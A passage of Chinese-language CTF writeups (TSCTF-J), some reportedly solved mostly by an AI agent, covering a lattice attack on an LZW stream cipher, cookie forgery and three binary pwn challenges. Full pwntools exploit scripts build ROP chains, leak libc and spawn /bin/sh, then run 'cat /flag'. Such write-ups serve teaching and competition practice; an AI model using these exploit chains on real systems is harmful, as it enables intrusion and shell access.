                del self.buf[:end]
                return data
            chunk = self.sock.recv(65536)
            if not chunk:
                raise ConnectionError("connection closed")
            self.buf.extend(chunk)

    def send(self, text):
        self.sock.sendall(text.encode() + b"\n")

    def menu_guest_cookie(self):
        self.send("1")
        blob = self.read_until(b"Select an option: ")
        return re.search(rb"Cookie: ([0-9a-fA-F]+)", blob).group(1).decode()

    def menu_aes4(self):
        """menu 2：四重 AES 加密固定明文，本 writeup 未使用（诱饵）。"""
        self.send("2")
        blob = self.read_until(b"Select an option: ")
        return re.search(rb"Ciphertext: ([0-9a-fA-F]+)", blob).group(1).decode()

    def menu_super(self, cookie_hex, k1_hex, k2_hex, p_hex):
        self.send("3")
        for prompt, value in ((b"admin cookie (hex): ", cookie_hex),
                              (b"key1 (hex, 16 chars): ", k1_hex),
                              (b"key2 (hex, 16 chars): ", k2_hex),
                              (b"plaintext (hex): ", p_hex)):
            self.read_until(prompt)
            self.send(value)
        blob = self.read_until(b"Select an option: ")
        return re.search(rb"Ciphertext: ([0-9a-fA-F]+)", blob).group(1).decode()

    def menu_wots(self, digest_hex, signature_hex):
        self.send("4")
        self.read_until(b"digest (hex, 8 chars): ")
        self.send(digest_hex)
        self.read_until(b"signature (hex, 512 chars): ")
        self.send(signature_hex)
        blob = self.read_until(b"-----END RSA PRIVATE KEY-----").decode()
        self.read_until(b"Select an option: ")
        start = blob.index("-----BEGIN RSA PRIVATE KEY-----")
        return blob[start:] + "\n"


def recover_master_key(cookie_hex):
    """menu 1 的已知明文对 -> 2**16 枚举 MASTER_KEY。"""
    raw = bytes.fromhex(cookie_hex)
    iv, ct = raw[:16], raw[16:32]
    target = xor(pad(b"role=guest", 16), iv)
    for hi in range(256):
        for lo in range(256):
            cand = bytes([hi, lo]) + b"\x00" * 14
            if AES.new(cand, AES.MODE_ECB).encrypt(target) == ct:
                return cand
    raise RuntimeError("MASTER_KEY not found")


def forge_admin_cookie(master_key):
    iv = os.urandom(16)
    ct = AES.new(master_key, AES.MODE_ECB).encrypt(xor(pad(b"role=admin", 16), iv))
    return (iv + ct).hex()


def flip_guest_cookie(guest_cookie_hex):
    """零密钥备选：复用 guest 密文块，只翻转可控的 CBC IV。"""
    raw = bytes.fromhex(guest_cookie_hex)
    iv, ct = raw[:16], raw[16:32]
    new_iv = xor(iv, xor(pad(b"role=guest", 16), pad(b"role=admin", 16)))
    return (new_iv + ct).hex()


def strip_outer_aes(master_key, ct_hex):
    """去掉外层 AES_MK(pad(G(...), 16))，返回 G(...)。"""
    return unpad(AES.new(master_key, AES.MODE_ECB).decrypt(bytes.fromhex(ct_hex)), 16)


def main():
    link = Link(HOST, int(PORT), use_tls=USE_TLS)
    try:
        link.read_until(b"Select an option: ")

        # 1. MASTER_KEY：menu 1 的已知明文对，2**16 枚举
        cookie_hex = link.menu_guest_cookie()
        mk = recover_master_key(cookie_hex)

        # 2. 过 check_admin()：有密钥就自选 IV 重算；零密钥则翻转 guest cookie 的 IV
        if ADMIN_BYPASS == "cbc":
            admin = flip_guest_cookie(cookie_hex)
        else:
            admin = forge_admin_cookie(mk)
        link.menu_super(admin, WEAK_UPPER, WEAK_LOWER, "00" * 8)

        # 3. WOTS 伪造：digest 每位都是 15，链迭代 0 次，签名 = 公钥 -> 换到 RSA 私钥
        rsa_key = RSA.import_key(link.menu_wots("ffffffff", WOTS_PUBKEY_HEX))

        # 4. 触发 flag 分支（p_bytes == k1_bytes + k2_bytes）-> y = G(flag_encrypted)
        y = strip_outer_aes(mk, link.menu_super(admin, WEAK_UPPER, WEAK_LOWER, WEAK_LOWER * 2))[:RSA_CT_LEN]

        # 5. G 是对合（weak DES，k1 = k2）：把 y 送回，第二次剥掉外层 AES 即得 flag_encrypted
        flag_ct = None
        for tag in (b"", b"\x01", b"\x02", b"\x03"):
            cand = strip_outer_aes(mk, link.menu_super(admin, WEAK_UPPER, WEAK_LOWER, (y + tag).hex()))[:RSA_CT_LEN]
            if cand == y:
                continue
            try:
                PKCS1_OAEP.new(rsa_key).decrypt(cand)
                flag_ct = cand
                break
            except ValueError:
                continue
        if flag_ct is None:
            raise RuntimeError("could not unwrap G / OAEP decrypt")

        # 6. RSA-OAEP 解密（load_flag() 交付 pad(FLAG, 8)，需去 PKCS#7）
        raw = PKCS1_OAEP.new(rsa_key).decrypt(flag_ct)
        try:
            flag = unpad(raw, 8).decode()
        except ValueError:
            flag = raw.decode("ascii", "replace")
        print(flag)
    finally:
        link.sock.close()


if __name__ == "__main__":
    main()
```

<div class="pagebreak"></div>

# clear_after_64 Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：crypto
- flag：`TSCTF-J{clear_codes_leak_truncated_congruences}`

## 思路

1. `compress()` 是带强制复位的 LZW（最长短语匹配 + 周期性 `CLEAR`），参数为 `WORD_BITS = 12`、`RESET_AFTER = 64`、`CLEAR = 256`、`EOI = 257`。编码器行为完全确定：开头先写一个 `CLEAR`；此后每写满 64 个普通码字就再强制插入一个 `CLEAR`，并清空字典、把下一个可用码字重置为 258；结尾补一个 `EOI`。
2. `output.json` 给出 `count = 597`，按 64 周期展开正好是 `1(初始 CLEAR) + 9×(64 普通码 + CLEAR) + 9 普通码 + EOI = 597`。于是码流结构完全确定：10 个 `CLEAR` 落在下标 `0, 65, 130, …, 585`，`EOI` 落在 `596` —— 这 11 个位置的**明文码字已知**，不需要任何猜测。码字以 12 bit 小端紧凑打包，`unpack()` 断言读入长度等于 `(12*count+7)//8` 且高位填充为 0。
3. 加密是 `cipher_step()`：`middle = (MULTIPLIER*state + INCREMENT) mod 2^96`，`pad = middle >> 84`（取中间态高 12 位），`word = (code + pad) mod 2^12`，`next_state = (middle + FEEDBACK*word) mod 2^96`。
4. 反馈项只用**已给出的密文** `word`，所以 `middle_n` 关于 `seed` 的递推完全公开可算：`middle_n = MULTIPLIER^(n+1)·seed + C_n (mod 2^96)`，其中 `C_0 = INCREMENT`、`C_{n+1} = MULTIPLIER·C_n + MULTIPLIER·FEEDBACK·w_n + INCREMENT (mod 2^96)` 只依赖密文与公开常量。
5. 第 `n` 个已知码字给出 `pad_n = middle_n >> 84`，即 `(w_n - code_n) mod 2^12 = middle_n >> 84`，等价于 `middle_n mod 2^84` 落在一个唯一确定的区间内。这是**截断同余 / 高位泄漏**：11 个已知位置 × 12 bit = 132 bit 泄漏量，超过 96 bit 的 seed，信息量足以定出唯一解。
6. 归一化：令 `x = middle_0 - p_0·2^84 ∈ [0, 2^84)`（`B = 1<<84`，`p_0` 是下标 0 处已知的 pad）。把它代入其余 10 个泄漏位置，得到 `(M^(n_j)·x + gamma_j) mod 2^96 ∈ [0, 2^84)`，即 HNP / CVP 形式。
7. 搭格：维度 `d = 10 + 1 = 11`。首行取 `(1, M^(n_1), …, M^(n_10))`，其余每个 `e_j` 方向放 `2^96`；于是格点形如 `(x, M^(n_j)·x + 2^96·z_j)`，首坐标就是 `x`。取目标向量 `(0, -gamma_j)`，最近格点到目标的偏移恰好是 `(x, (M^(n_j)·x + gamma_j) mod 2^96)`，各分量界为 `B = 1<<84`，因此这正是 CVP。
8. 用 LLL / NTL:LLL / BKZ 三种归约基各跑一次 Babai 最近平面求 CVP，把首坐标连同其取负、`mod 2^96` 变体收敛到 `[0, B)` 作为 `x` 候选，再回代 `seed = MULTIPLIER^(-1)·(p_0·B + x - INCREMENT) mod 2^96`。verify 会重跑整条密钥流、核对 11 个结构性位置，再走 `decompress()`（它对缺少初始 `CLEAR`、`CLEAR` 不在 64 周期边界、缺少周期 `CLEAR`、`EOI` 不在末尾、非法码字都会抛错），通过者即为明文，从中取含 `TSCTF-J` 的行。

## EXP

```python
"""
TSCTF-J  Clear After 64  —— solve

还原思路
--------
1. `compress` 的结构是确定的：初始 CLEAR，之后每 64 个普通码字强制一个 CLEAR。
   count=597  ->  1(初始CLEAR) + 9*(64普通+CLEAR) + 10普通 + EOI
   于是码流里哪些位置是 CLEAR(256)、哪个是 EOI(257) 全部已知。
2. 流密码 next_state = middle + FEEDBACK*word 只依赖 seed 和**已知**密文，
   所以 pad_n = (word_n - code_n) mod 4096 = middle_n >> 84 是关于 seed 的已知仿射函数。
   11 个已知码字 -> 11*12 = 132 bit 约束（> 96 bit 的 seed）。
3. 找 seed 等价于 HNP：
   middle_n = M^(n+1)*seed + C_n (mod 2^96)          # C_n 由密文递推，全部已知
   记 x = middle_0 - p_0*2^84 ∈ [0,2^84)，则
   (M^n * x + gamma_n) mod 2^96 ∈ [0, 2^84)   (n = 65,130,...,585,596)
   这是 11 维格里的 CVP：唯一最近格点的首坐标就是 x。
"""
import base64, json
from sage.all import *

MOD = 1 << 96
B = 1 << 84                      # 低 84 bit 未知，高 12 bit 已知
WORD = 1 << 12
MULT = 0x1613E8CA97418227B4B83B65
INC = 0x62E99AE43BA0AC21A626DC09
FB = 0xD9A658AC69AD830E560666ED
CLEAR, EOI = 256, 257
BASE = __file__.rsplit("/", 1)[0] if "/" in __file__ else "."

# ---------------------------------------------------------------- helpers --
def unpack(data, count):
    assert len(data) == (12 * count + 7) // 8
    bits = int.from_bytes(data, "little")
    assert bits >> (12 * count) == 0
    return [(bits >> (12 * i)) & 0xFFF for i in range(count)]

def decompress(codes):
    dictionary = {b: bytes([b]) for b in range(256)}
    next_code, since_clear, previous = 258, 0, None
    out, expected = bytearray(), False
    for i, code in enumerate(codes):
        if code == CLEAR:
            dictionary = {b: bytes([b]) for b in range(256)}
            next_code, since_clear, previous, expected = 258, 0, None, False
            continue
        if code == EOI:
            assert i == len(codes) - 1
            return bytes(out)
        if expected:
            raise ValueError("missing CLEAR")
        if code in dictionary:
            entry = dictionary[code]
        elif previous is not None and code == next_code:
            entry = previous + previous[:1]
        else:
            raise ValueError("bad code")
        out += entry
        if previous is not None:
            dictionary[next_code] = previous + entry[:1]
            next_code += 1
        previous, since_clear = entry, since_clear + 1
        expected = since_clear == 64
    raise ValueError("no EOI")

# ------------------------------------------------------------------ data ---
obj = json.load(open(BASE + "/output.json"))
count = int(obj["count"])
e = unpack(base64.b64decode(obj["data"]), count)

# 结构性已知码字
known = {0: CLEAR, 596: EOI}
for k in range(1, 10):
    known[65 * k] = CLEAR
leaks = sorted(known)                       # [0, 65, ..., 585, 596]
p = {n: (e[n] - known[n]) % WORD for n in leaks}   # pad_n = 高 12 bit of middle_n

# ------------------------------------------------- middle_n = M^(n+1) s + C_n
C = [0] * count
C[0] = INC % MOD
for n in range(count - 1):
    C[n + 1] = (MULT * C[n] + MULT * FB * e[n] + INC) % MOD

# x := middle_0 - p[0]*B  ->  seed = M^-1 (p0*B + x - INC)
# middle_n = M^n * x + beta_n
beta = {n: (pow(MULT, n, MOD) * (p[0] * B - INC) + C[n]) % MOD for n in leaks}
rest = leaks[1:]                                    # 65,...,585,596
gamma = [(beta[n] - p[n] * B) % MOD for n in rest]

# ------------------------------------------------------------------ CVP ----
# L = { (x, y_1..y_m) : y_j = M^(n_j) * x + MOD * z_j }
#   -> 唯一的短向量偏移就是 (x, x_{n_1}, ..., x_{n_m})，每个分量 < 2^84
d = len(rest) + 1
rows = [[1] + [int(pow(MULT, n, MOD)) for n in rest]]
for j in range(len(rest)):
    r = [0] * d; r[1 + j] = MOD; rows.append(r)
Lat = Matrix(ZZ, rows)
target = vector(ZZ, [0] + [int((-g) % MOD) for g in gamma])

def babai(basis, t):
    bs = [vector(QQ, r) for r in basis.rows()]
    n = len(bs)
    G = [vector(QQ, [0] * n) for _ in range(n)]
    mu = [[QQ(0)] * n for _ in range(n)]
    for i in range(n):
        G[i] = bs[i]
        for j in range(i):
            mu[i][j] = bs[i].dot_product(G[j]) / G[j].dot_product(G[j])
            G[i] -= mu[i][j] * G[j]
    b = vector(QQ, t)
    for i in range(n - 1, -1, -1):
        b -= (b.dot_product(G[i]) / G[i].dot_product(G[i])).round() * bs[i]
    return t - b

def verify(seed):
    st = seed
    codes = []
    for w in e:
        mid = (MULT * st + INC) % MOD
        codes.append((w - (mid >> 84)) % WORD)
        st = (mid + FB * w) % MOD
    for n, c in known.items():
        if codes[n] != c:
            return None
    try:
        return decompress(codes)
    except Exception:
        return None

cands = []
for tag, basis in [("LLL", Lat.LLL()),
                   ("NTL", Lat.LLL(algorithm="NTL:LLL")),
                   ("BKZ", Lat.BKZ(block_size=d))]:
    v = babai(basis, target)
    x = ZZ(v[0])
    for cand in [x, -x, x % MOD, (-x) % MOD]:
        for k in (-1, 0, 1, 2):
            xv = cand + k * MOD
            if 0 <= xv < B:
                cands.append((tag, ZZ(xv)))

for tag, x in cands:
    seed = (inverse_mod(MULT, MOD) * (p[0] * B + x - INC)) % MOD
    data = verify(seed)
    if data is not None:
        print("[%s]  x    = %d" % (tag, x))
        print("[%s]  seed = 0x%024X" % (tag, seed))
        for line in data.decode(errors="replace").splitlines():
            if "TSCTF-J" in line:
                print("\nFLAG =", line.strip())
        break
```

<div class="pagebreak"></div>

# bf Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：pwn
- flag：`TSCTF-J{++[-<-<+[---->]<<]>>>+.>+.--.<++++.>-.---.>>.<<<++++++.------.<<.}`

## 思路

1. 保护机制：`bf` 是静态链接、只用 syscall 的 ELF64 Brainfuck 解释器，不依赖 libc；non-PIE，无 canary，NX 开启，无 RELRO，镜像内有 RWX 段。所有地址都是固定常量，不需要泄漏。
2. 漏洞点一：`_build_map()` 用真实栈做括号匹配（`[` push、`]` pop），没有配对检查。多给一个 `]` 就会 pop 掉 `call _build_map` 压入的返回地址（`0x401024`）；随后 `sub rax, r8` 下溢，越界检查 `cmp rax, rcx; jnb invalid_index` 命中，走到 `.invalid_index: retn` —— `ret` 从 `code[0..7]`（也就是 BF 源码的前 8 字节）取 RIP。于是 RIP 由输入的前 8 字节控制，且 `rsp = S+8`。
3. 漏洞点二：`_run()` @ `0x401078` 把 RCX 当循环上界（`mov rcx, r13` … `cmp rbx, rcx`），但 x86-64 的 `syscall` 会把返回 RIP 写进 RCX，所以只要程序里出现第一个 BF `,` 或 `.`，上界就被改成 `~0x4010fd`。解释器不再在 200 字节缓冲区末尾停下，整段 200 字节 `read` 实际上就是一段 BF 程序，可以一直执行到数据段（`.bss` 中的 `map[]` @ `0x4030BC`、`tape[]` @ `0x4036FC`）。
4. 利用链 stage1（正好 200 字节）：
   - `[0..7]` = `p64(_run)`：借漏洞点一拿到 RIP 控制；
   - `[8]` = `]`（必须是这个字节，用它触发不配对）；`rsp+8` 指向 `[16]`，所以 `[8..15]` 放一个无害跳板 `_write` @ `0x40115D`；
   - `[16..23]` = `p64(0x401142)`（`mov rsi,r12; mov edx,0xC8; call _read`），让解释器再读一段；
   - `[24..]` 是 BF 程序：`,`×8 把 `/bin/sh\0` 写进 tape；`<`×15 把数据指针挪到 `map[199]`（正好在 tape 下方 8 字节）；再 `,`×8 把 `map[199]` 写成 `0x41414141`；最后一个 `<` 指向一个 0 值单元；
   - `[199]` = `[`：因为 `[rdi]==0`，`rbx = map[199] = 0x41414141`，`inc rbx` 后超过被污染的 `rcx`，于是走 `_run.done: retn` 干净返回，而不是继续乱跑。
5. 利用链 stage2（正好 59 字节）：第二次 `read(0,S,200)` 返回 59，`rax = 59 = SYS_execve`；同时 `read` 自己压入的返回地址被新数据覆盖，`ret` 就落到 `stage2[16..23]` 的 ROP 链：

   ```
   pop rdi ; ret                      -> "/bin/sh\0"（在 tape 上）
   xor rdx,rdx; xor rsi,rsi ; ret
   syscall                            -> execve("/bin/sh", NULL, NULL)
   ```
6. 关键坑：发送节奏决定成败。`read(0,S,200)` 上限 200，stage1 恰好吃满；中间 16 次 BF `,` 是单字节读，两次 8 字节填充必须分批发送；最后一段必须恰好返回 59 字节，所以 shell 命令要等链跑起来之后再发。
7. 关键常量：`RUN = 0x401078`、`WRITE = 0x40115D`、`READ_BF_TAIL = 0x401142`、`SYSCALL = 0x40115A`、`POP_RDI = 0x4011C5`、`ZERO_RDX_RSI = 0x4011C7`、`TAPE = 0x4036FC`、`MAP = 0x4030BC`、`TERM = 199`、`FAKE_TARGET = 0x41414141`。

## EXP

```python
from pwn import *
import sys
import time

HOST = "<TARGET>"

context.log_level = "info"
context.arch = "amd64"

RUN = 0x401078           # _run              : r8=r12, rdi=tape, rcx=r13, rbx=0
WRITE = 0x40115D         # mov eax,1; mov edi,1; syscall; ret   (无害跳板)
READ_BF_TAIL = 0x401142  # mov rsi,r12; mov edx,0xC8; call _read; ret
SYSCALL = 0x40115A       # syscall; ret
POP_RDI = 0x4011C5       # pop rdi; ret
ZERO_RDX_RSI = 0x4011C7  # xor rdx,rdx; xor rsi,rsi; ret
TAPE = 0x4036FC          # .bss tape[]，BF 数据指针起点
MAP = 0x4030BC           # map[] 数组基址

TERM = 199               # '[' 终结符：200 字节 read 的最后一字节
FAKE_TARGET = 0x41414141  # 任意大于被污染 rcx (~0x4010fd) 的值


def build():
    assert MAP + TERM * 8 == TAPE - 8, "map[199] 必须紧邻 tape 下方"

    prog = (b"," + b">") * 7 + b","          # tape[0..7] = "/bin/sh\0"
    prog += b"<" * 15                        # rdi = tape-8 == &map[199]
    prog += (b"," + b">") * 7 + b","         # map[199] = FAKE_TARGET
    prog += b"<"                             # rdi -> 一个 0x00 单元 => [rdi] == 0

    stage1 = p64(RUN) + p64(WRITE) + p64(READ_BF_TAIL) + prog
    stage1 += b"\x00" * (TERM - len(stage1)) + b"["
    assert len(stage1) == 200, len(stage1)
    assert stage1[8] == 0x5D and stage1[TERM] == 0x5B

    stage2 = b"\x00" * 16 + p64(POP_RDI) + p64(TAPE) + p64(ZERO_RDX_RSI) + p64(SYSCALL)
    stage2 += b"\x00" * (59 - len(stage2))
    assert len(stage2) == 59, len(stage2)
    return stage1, stage2


def exploit(io, local=False, gap=0.25):
    stage1, stage2 = build()
    io.recvuntil(b":", timeout=20)          # banner 以 ':' 结尾

    # 分帧发送：read(0,S,200) 上限 200，stage1 恰好吃满；
    # 16 次 BF ',' 是单字节读，所以两段 8 字节填充必须精确送入；
    # 最后一次 read(0,S,200) 必须恰好返回 59 字节，rax 才等于 execve 的 59，
    # 因此 shell 命令不能提前在途，需要留出小间隔。
    io.send(stage1)
    time.sleep(gap)
    io.send(b"/bin/sh\x00")                 # BF ',' x8 -> tape
    time.sleep(gap)
    io.send(p64(FAKE_TARGET))               # BF ',' x8 -> map[199]
    time.sleep(gap)
    io.send(stage2)                         # read() 返回 59 -> rax = 59 = execve
    time.sleep(0.5)

    paths = b"/flag* /flag /flag.txt"
    if local:
        paths += b" /tmp/bfdbg/flag"
    io.sendline(b"echo PWNED; cat " + paths + b" 2>/dev/null; echo __DONE__")
    return io.recvrepeat(6)


def main():
    arg = (sys.argv[1] if len(sys.argv) > 1 else "remote").lower()
    tries = 1 if arg in ("1", "once") else 12
    local = arg == "local"
    for i in range(1, tries + 1):           # 发送节奏对时序敏感，失败重试
        try:
            if local:
                io = remote("<TARGET>", <PORT>)              # 本地调试目标（无 TLS）
            else:
                io = remote(HOST, <PORT>, ssl=True, sni=HOST)
            data = exploit(io, local=local)
            io.close()
        except Exception as ex:
            log.warning("attempt %d: %s" % (i, ex))
            continue
        if b"__DONE__" in data or b"{" in data:
            print(data.decode(errors="replace"))
            return
    log.failure("no flag")


if __name__ == "__main__":
    main()
```

<div class="pagebreak"></div>

# flag_memory Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：pwn
- flag：`TSCTF{stdi0_remembers_what_y0u_f0rg0t}`

## 思路

1. 保护机制：non-PIE（`ET_EXEC`），无 canary，NX 开启，Full RELRO（`GNU_RELRO` + `DT_FLAGS` 的 `DF_BIND_NOW`）。`main` @ `0x4011E1`、`true_end` @ `0x4011AB`、`pop rdi; ret` @ `0x4011A6`、裸 `ret` @ `0x40101A` 全是固定常量，不需要任何地址泄漏。
2. 漏洞点：`main()` 先把 flag 读进堆再抹掉，随后用一次 80 字节的栈溢出读入数据：

   ```c
   save_data = malloc(0x80);
   fgets(save_data, 128, fopen("/flag", "r"));   // flag 进堆
   memset(save_data, 0, 0x80);                   // 原地抹除
   printf("[Memory] Original location: %p\n", save_data);   // 堆地址泄漏
   read(0, answer[32], 0x50);                    // 80 字节栈溢出
   ```

   `0x50 = 80` 字节 = 56 填充 + `ret`(8) + 两个 qword，刚好是一条 ROP 链。
3. 关键点：`memset` 只清了 `save_data` 自己那块 chunk，而 `fgets`/`fopen` 走 stdio 时会为 FILE 惰性分配一个 **stdio 缓冲区**，flag 原文还留在那里。堆布局为：

   ```
   chunk A1 (save_data, 0x90) | chunk F1 (FILE, S) | chunk B1 (stdio buf, T)
   ```
4. 第一轮利用：`pad56 + ret + main` 回到 `main`，再触发一次泄漏。此时新的 `save_data` 紧接在**第一次的 stdio 缓冲之后**，于是

   ```
   leak2 = leak1 + 0x90 + S + T   =>   flag 缓冲地址 = leak2 - T
   ```

   （`T` 是 stdio 缓冲 chunk 大小，实测 `0x1010`；`S` 是 FILE 结构体 chunk 大小，可由 `leak2 - leak1 - 0x90 - T` 反推校验。）
5. 第二轮利用：`pad56 + pop rdi; ret + ptr + true_end`。`true_end(char *memory)` 里就是 `printf("%s", memory)`，直接把 flag 打出来。
6. 栈对齐：`true_end` 的序言 `push rbp; mov rbp,rsp; sub rsp,0x10` 会破坏 `call puts/printf` 的对齐（System V ABI 要求 `call` 时 `RSP % 16 == 0`）。对齐模式多填一个可写 `rbp`（`0x404800`）并从 `true_end+8`（`0x4011B3`）进入，跳过序言，让 `call` 前的栈重新 16 字节对齐。
7. 关键常量：`MAIN = 0x4011E1`、`RET = 0x40101A`、`POP_RDI = 0x4011A6`、`TRUE_END = 0x4011AB`、`TRUE_END_BODY = 0x4011B3`、`BSS = 0x404800`、`T = 0x1010`，payload 长度上限 `0x50`。

## EXP

```python
import re
import sys

from pwn import *

context.clear(arch="amd64", log_level="info")

HOST = "<TARGET>"

MAIN = 0x4011E1           # 回到 main 再要一次泄漏
RET = 0x40101A            # 裸 ret（栈对齐）
POP_RDI = 0x4011A6        # memory_key: pop rdi ; ret
TRUE_END = 0x4011AB       # push rbp; mov rbp,rsp; sub rsp,0x10; ...
TRUE_END_BODY = 0x4011B3  # 跳过序言，进入时 rsp 已满足 call 的 16 字节对齐
BSS = 0x404800            # 可写，仅在对齐模式下当临时 rbp

LEAK_RE = re.compile(rb"Original location: (0x[0-9a-fA-F]+)")
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{1,32}\{[^}\r\n]{1,200}\}")

T = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x1010   # stdio 缓冲 chunk 大小
ALIGNED = len(sys.argv) > 2 and sys.argv[2] == "aligned"


def loop_chain():
    # 填到 ret（56 字节），裸 ret 对齐，再回到 main
    return b"A" * 56 + p64(RET) + p64(MAIN)


def win_chain(ptr):
    if ALIGNED:
        # 从 true_end+8 进入，使 `call puts` 前 rsp % 16 == 0
        return b"A" * 48 + p64(BSS) + p64(POP_RDI) + p64(ptr) + p64(TRUE_END_BODY)
    return b"A" * 56 + p64(POP_RDI) + p64(ptr) + p64(TRUE_END)


def main():
    io = remote(HOST, <PORT>, ssl=True, sni=HOST)

    io.recvuntil(b"Original location: ")
    leak1 = int(io.recvline().strip(), 16)

    # 第一轮溢出：回到 main，拿第二次堆泄漏
    io.recvuntil(b"> ")
    io.send(loop_chain().ljust(0x50, b"A"))

    io.recvuntil(b"Original location: ")
    leak2 = int(io.recvline().strip(), 16)

    ptr = leak2 - T
    log.info("leak1 (save_data #1) = %#x", leak1)
    log.info("leak2 (save_data #2) = %#x", leak2)
    log.info("delta = %#x  => FILE chunk S = %#x", leak2 - leak1, leak2 - leak1 - 0x90 - T)
    log.info("flag buffer guess = %#x (chunk size T=%#x)", ptr, T)

    # 第二轮：打印 flag 缓冲
    io.recvuntil(b"> ")
    io.send(win_chain(ptr).ljust(0x50, b"A"))

    out = io.recvrepeat(3)
    m = FLAG_RE.search(out)
    if m:
        log.success("FLAG: %s", m.group().decode())
    else:
        log.failure("no flag: T=%#x 猜错时改 T 重试", T)
    io.close()


if __name__ == "__main__":
    main()
```

<div class="pagebreak"></div>

# ret2libc Writeup

agent梭了大部分,但是它卡在IDA的extern虚拟段上了.

- 分类：pwn
- 附件：`pwn`（glibc 2.35 / Ubuntu 22.04，附带题给的 `libc.so.6`、`ld-linux-x86-64.so.2`）
- flag：`TSCTF{who_ar3_you_i_am_murasam3}`

## 思路

1. 保护机制：non-PIE，无 canary，NX 开启，Partial RELRO（有 `GNU_RELRO`，无 `BIND_NOW`），所有 gadget 与函数地址都是固定常量；随机化只影响 libc 基址，需要一次 libc 泄漏。
2. 主流程：`main` 走 `read(0, name, 0x1f)` → `filter(name)` → 进入 `while(1){ gate_ticket = 0x5A5A…; vuln(); }`。
3. 漏洞点 `vuln` 里有三层限制：
   - 进入时若 `first == 0` 且 `strcmp(name, "murasame") != 0` 就 `exit`（`first` 初值为 1，用过一次后置 0），所以**必须先让 `name` 等于 `murasame`**；
   - `read(0, buf[72 @ rbp-0x50], 0x200)` —— 栈溢出，返回地址偏移 `0x58`；
   - 读完后 `filter(buf, n)` 会**清掉 payload 里所有 `0x65` 字节（'e'）**；随后校验全局 `gate_ticket`，而返回主循环头会重新赋值，所以这条不影响利用。
4. 难点一：`"murasame"` 里的 'e' 正是被过滤的字节，没法直接输入。程序自带两个现成 helper：
   - `set_name(x)` @ `0x4011d6`：`memset(name,0,0x20); *(u64*)name = x;`
   - `patch_byte(p, b)` @ `0x401210`：`*p ^= b;`

   于是先 `set_name("murasamd")`，再 `patch_byte(name+7, 0x01)`，把最后一字节 `0x64 ^ 0x01 = 0x65` 变成 `'e'`。`0x64` 与 `0x01` 都不在过滤范围内。
5. 难点二：整个 payload 不能含 `0x65`，脚本用 `chain()` 对每条链做字节断言；libc 基址每次 ASLR 都可能让 `system` / `/bin/sh` 地址里出现 `0x65`，此时直接重连换一次随机化（脚本最多重试 30 次）。
6. 利用链：
   - 第一轮：`pop rdi; ret` + `puts(read@.got.plt)` 泄漏 libc 基址，然后返回 `main` 的循环头 `0x40141b`（重置 `gate_ticket`，并让下一轮重新走一遍溢出）；
   - 第二轮：再用一次 `set_name`/`patch_byte` 过 `murasame` 检查，随后 `pop rdi; /bin/sh` + `system` 拿到 shell。
7. 栈对齐：`vuln` 尾声 `ret` 时 `rsp % 16 == 8`，链首先放一个裸 `ret`（`0x40120f`）建立奇偶性，后续每个**函数**目标必须落在奇数槽位上。
8. 泄漏校验：`puts` 打印 `read@.got.plt` 的低 6 字节，减去 `libc.symbols["read"]` 得到基址，低 12 位必须为 0（`base & 0xFFF == 0`）才认为这次随机化可用；`.got.plt` 中 `read` 的地址是 `0x404038`，`name` 全局缓冲区在 `0x404080`。
9. 关键常量：`RET = 0x40120F`、`POP_RDI = 0x40123A`、`POP_RSI = 0x401243`、`POP_RDX = 0x40124C`、`PATCH_BYTE = 0x401210`、`SET_NAME = 0x4011D6`、`PUTS = 0x401040`、`GOT_READ = 0x404038`、`MAIN_LOOP = 0x40141B`、`NAME = 0x404080`、`BUF_OFF = 0x58`、`BAD = 0x65`。

## EXP

```python
import os
import re
import sys
import time

from pwn import *

context.clear(arch="amd64", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = "<TARGET>"

RET = 0x40120F           # 裸 ret（对齐滑板）
POP_RDI = 0x40123A
POP_RSI = 0x401243
PATCH_BYTE = 0x401210    # *p ^= b
SET_NAME = 0x4011D6      # memset(name,0,0x20); *(u64*)name = x
PUTS = 0x401040
GOT_READ = 0x404038      # read@.got.plt
MAIN_LOOP = 0x40141B     # main 的循环头：重置 gate_ticket 后再次 call vuln
NAME = 0x404080
BUF_OFF = 0x58

BAD = 0x65
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{1,32}\{[^}\r\n]{1,200}\}")

libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)
OFF_READ = libc.symbols["read"]
OFF_SYSTEM = libc.symbols["system"]
OFF_BINSH = next(libc.search(b"/bin/sh"))


def chain(*qwords):
    blob = b"".join(p64(q) for q in qwords)
    bad = [i for i, b in enumerate(blob) if b == BAD]
    assert not bad, "payload contains 0x65 at %r" % bad
    return blob


def attempt():
    io = remote(HOST, <PORT>, ssl=True, sni=HOST)
    io.recvuntil(b"who are you?\n")
    io.send(b"A")

    io.recvuntil(b"say something> ")
    time.sleep(0.3)
    io.send(b"A" * BUF_OFF + chain(
        RET,
        POP_RDI, 0x646D61736172756D,   # "murasamd"
        SET_NAME,
        POP_RDI, NAME + 7,
        POP_RSI, 0x01,
        PATCH_BYTE,                    # name[7] = 0x64 ^ 0x01 = 'e'
        POP_RDI, GOT_READ,
        PUTS,
        MAIN_LOOP,
    ))

    data = io.recvuntil(b"say something> ")
    # puts("say something> ") 自己留下的 "\n" 占 data[0]，6 字节泄漏从 data[1] 开始
    if not data.startswith(b"\n"):
        raise EOFError("no leak: %r" % data[:64])
    leak_bytes = data[1:7]
    if len(leak_bytes) != 6:
        raise EOFError("short leak: %r" % data[:64])
    leak = u64(leak_bytes.ljust(8, b"\0"))
    base = leak - OFF_READ
    if base & 0xFFF:
        raise EOFError("bad leak %#x -> base %#x" % (leak, base))
    log.success("read@libc = %#x  =>  libc base = %#x", leak, base)

    system = base + OFF_SYSTEM
    binsh = base + OFF_BINSH
    log.info("system = %#x   /bin/sh = %#x", system, binsh)
    for addr in (system, binsh):
        if BAD in p64(addr):
            raise EOFError("0x65 inside %#x -- new ASLR roll" % addr)

    time.sleep(0.3)
    io.send(b"A" * BUF_OFF + chain(RET, POP_RDI, binsh, system, MAIN_LOOP))

    time.sleep(0.5)
    io.sendline(b"cat /flag* /flag 2>/dev/null; echo __END__")
    out = io.recvrepeat(3)

    m = FLAG_RE.search(out)
    if m:
        log.success("FLAG: %s", m.group().decode())
        io.interactive()
        return True
